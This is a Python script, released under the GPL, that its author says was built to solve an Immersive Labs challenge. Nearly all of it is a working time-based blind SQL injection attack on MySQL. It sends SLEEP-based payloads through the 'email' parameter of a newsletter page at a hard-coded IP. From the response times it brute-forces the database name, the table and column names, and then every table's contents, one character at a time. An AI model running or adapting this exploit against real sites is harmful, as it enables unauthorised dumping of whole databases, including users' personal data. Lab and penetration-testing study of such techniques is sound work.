#Time-based Blind SQL Injection Tool for ethical penetration testing
#    Copyright (C) 2021  Hamish Starling

# This program is free software: you can redistribute it and/or modify
#     it under the terms of the GNU General Public License as published by
#     the Free Software Foundation, either version 3 of the License, or
#     (at your option) any later version.

#     This program is distributed in the hope that it will be useful,
#     but WITHOUT ANY WARRANTY; without even the implied warranty of
#     MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#     GNU General Public License for more details.

#     You should have received a copy of the GNU General Public License
#     along with this program.  If not, see <https://www.gnu.org/licenses/>.


#Created to solve an immersive labs challenge
#Built specifically for MySQL but could be adapted

import requests
import time
	
TARGET_IP = "10.102.11.143"
GET_PARAM_NAME = "email"
PAGE_NAME = "newsletter.php"
ALPHABET = "abc,defghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789"
MAX_DB_LENGTH = 30
MAX_TABLE_NAME_LENGTH = 20
MAX_COLUMN_NAME_LENGTH = 20
TIME_DELAY = 1

def makeRequest(toInject):
	"""Returns boolean: True if the request led to success, False is the request led to failure, based on time of response"""
	tick = time.time()
	requests.get("http://"+TARGET_IP+"/"+PAGE_NAME,params={GET_PARAM_NAME:toInject}).text
	tock = time.time()
	return (tock-tick > TIME_DELAY)

#Brute force the length of the name of the database using time-based blind SQLi
for i in range(MAX_DB_LENGTH):
	if (makeRequest("' OR IF(LENGTH(DATABASE())='"+str(i) + "',SLEEP("+str(TIME_DELAY)+"),'NO') AND '1'='1")):
		break
print("Name of database has length: "+str(i))

#Brute force the name of the database using time-based blind SQLi
dbName = ""
for j in range(i+1):
	for char in ALPHABET:
		query = "' OR IF(SUBSTR(DATABASE(),"+str(j)+",1) ='"+char+"',SLEEP("+str(TIME_DELAY)+"),'NO') AND '1'='1"
		if makeRequest(query):
			dbName = dbName + char
			break
print("Database is called: "+dbName)

#Brute force the length of all of the table names joined together using time-based blind SQLi
for i in range(MAX_TABLE_NAME_LENGTH):
	query = "' OR IF((SELECT LENGTH(GROUP_CONCAT(table_name SEPARATOR ',')) FROM information_schema.tables WHERE table_schema='" + dbName + "') = '"+str(i)+"',SLEEP("+str(TIME_DELAY)+"),'NO') AND '1'='1"
	if (makeRequest(query)):
		break
print("Length of table names is: " + str(i))


#Brute force all of the table names in the current database joined together using time-based blind SQLi 
tableNames = ""
for j in range(i+1):
	for char in ALPHABET:
		query = "' OR IF(SUBSTR((SELECT GROUP_CONCAT(table_name SEPARATOR ',') FROM information_schema.tables WHERE table_schema='" + dbName + "'),"+str(j)+",1) ='"+char + "',SLEEP("+str(TIME_DELAY)+"),'NO') AND '1'='1"
		if makeRequest(query):
			tableNames = tableNames + char
			break
print("Tables are called: "+tableNames)


#Get the actual data out of each table in the current database
tables = tableNames.split(",")
for tableName in tables: #for all tables
	#Get length of all columns in this table
	for i in range(MAX_COLUMN_NAME_LENGTH):
		query = "' OR IF((SELECT LENGTH(GROUP_CONCAT(COLUMN_NAME SEPARATOR ',')) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='" + dbName + "' AND TABLE_NAME='"+tableName+"') = '"+str(i)+"',SLEEP("+str(TIME_DELAY)+"),'NO') AND '1'='1"
		if (makeRequest(query)):
			break
	print("Total length of column names in table "+tableName+" is " + str(i))

	#Get all column names in this table
	allCols = ""
	for j in range(i+1):
		for char in ALPHABET:
			query = "' OR IF(SUBSTR((SELECT GROUP_CONCAT(COLUMN_NAME SEPARATOR ',') FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='" + dbName + "' AND TABLE_NAME='"+tableName+"'),"+str(j)+",1) ='"+char+"',SLEEP("+str(TIME_DELAY)+"),'NO') AND '1'='1"
			if makeRequest(query):
				allCols = allCols + char
				break
	print("The columns are called: "+allCols)


	#Now get all column data from each table, starting with the length and then the actual data
	cols = allCols.split(",")
	for col in cols:
		for i in range(200):
			query = "' OR IF((SELECT LENGTH(GROUP_CONCAT("+col+" SEPARATOR ',')) FROM "+tableName+") = '"+str(i)+"',SLEEP("+str(TIME_DELAY)+"),'NO') AND '1'='1"
			if (makeRequest(query)):
				break
		print("Total length of column data in "+ col +" is " + str(i))	

		columnData = ""
		for j in range(i+1):
			for char in ALPHABET:
				query = "' OR IF(SUBSTR((SELECT GROUP_CONCAT("+col+" SEPARATOR ',') FROM "+tableName+"),"+str(j)+",1) ='"+char+"',SLEEP("+str(TIME_DELAY)+"),'NO') AND '1'='1"
				if makeRequest(query):
					columnData = columnData + char
					break
		print("The data in column "+col+" is: "+columnData)
	print("\n") #Newline to separate data for each table